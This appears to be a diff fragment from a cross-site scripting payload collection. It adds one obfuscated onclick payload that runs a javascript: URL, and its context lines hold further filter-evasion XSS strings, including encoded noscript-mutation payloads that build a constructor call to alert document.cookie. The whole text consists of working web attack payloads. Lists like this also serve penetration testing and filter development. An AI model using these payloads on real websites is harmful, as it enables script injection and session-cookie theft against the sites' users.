@@ -15,6 +15,7 @@ test ‘-Function`self[‘a’+’l’+’e’+’r’+’t’](1)```-’
 JavaScript​:"<Svg/OnLoad​=alert%25%0A26lpar;1)>"
 :"\%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>"
 "<!--><Svg+OnLoad%3dconfirm%3f.(%2fcypher😈%2f)<!--1")
+" onclick​=l&#92;u{6F}cati&#92;u{6F}n.href="javascript​:alert(1)">
 \u003Cnoscript\u003E\u003Cp title=\u0022\u003C\u002Fnoscript\u003E\u003Cimg src=x onerror=\u0028\u005B\u002CO\u002CB\u002CJ\u002CE\u002CC\u002C\u002C\u005D=\u005B\u005D\u002B\u007B\u007D\u002C\u005BT\u002CR\u002CU\u002CE\u002CF\u002CA\u002CL\u002CS\u002C\u002C\u002CN\u005D=\u005B\u0021\u0021O\u005D\u002B\u0021O\u002BB.E\u005D\u005BX=C+O+N+S+T+R+U+C+T+O+R\u005D\u005BX\u005D(A+L+E+R+T+(document.cookie))()\u003E\u0022\u003E
 &#60;noscript&#62;&#60;p title=&#34;&#60;&#47;noscript&#62;&#60;img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()&#62;&#34;&#62;
 &#x3C;noscript&#x3E;&#x3C;p title=&#x22;&#x3C;&#x2F;noscript&#x3E;&#x3C;img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()&#x3E;&#x22;&#x3E;
